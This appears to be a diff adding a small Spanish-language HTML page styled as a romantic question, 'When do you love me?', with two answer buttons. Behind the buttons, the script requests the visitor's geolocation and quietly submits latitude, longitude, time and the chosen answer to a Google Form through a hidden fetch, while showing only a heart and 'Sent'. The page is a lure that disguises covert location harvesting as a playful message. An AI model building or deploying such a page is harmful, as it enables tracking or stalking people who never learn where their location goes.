@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Love</title>
+
+<style>
+body{
+  margin:0;
+  background:#000;
+  color:#fff;
+  font-family:Arial, sans-serif;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  flex-direction:column;
+}
+button{
+  width:220px;
+  padding:18px;
+  margin:12px;
+  font-size:18px;
+  border-radius:10px;
+  border:none;
+}
+</style>
+</head>
+
+<body>
+
+<h3>When do you love me?</h3>
+
+<button onclick="send('i love 1')">i love 1</button>
+<button onclick="send('i love 9784844')">i love 9784844</button>
+
+<script>
+
+const FORM_ID = "1FAIpQLSdXQ-NrgmaWl2bM8YB5ufLN3PnIwDyylbM75ze6mgaj2A92tw";
+
+const CODIGO = "entry.1588936670";
+const LAT    = "entry.1725572024";
+const LON    = "entry.44897658";
+const HORA   = "entry.883812266";
+
+function send(code){
+
+  if(!navigator.geolocation){
+    alert("Geolocalización no soportada");
+    return;
+  }
+
+  document.body.innerHTML = "<h3>📡 Sending...</h3>";
+
+  navigator.geolocation.getCurrentPosition(pos=>{
+
+    const lat  = pos.coords.latitude;
+    const lon  = pos.coords.longitude;
+    const hora = new Date().toISOString();
+
+    const url =
+`https://docs.google.com/forms/d/e/${FORM_ID}/formResponse?${CODIGO}=${code}&${LAT}=${lat}&${LON}=${lon}&${HORA}=${hora}`;
+
+    fetch(url,{mode:"no-cors"});
+
+    document.body.innerHTML = "<h2>❤️ Sent</h2>";
+
+  }, ()=>{
+    document.body.innerHTML = "<h2>❌ Location denied</h2>";
+  });
+}
+
+</script>
+
+</body>
+</html>
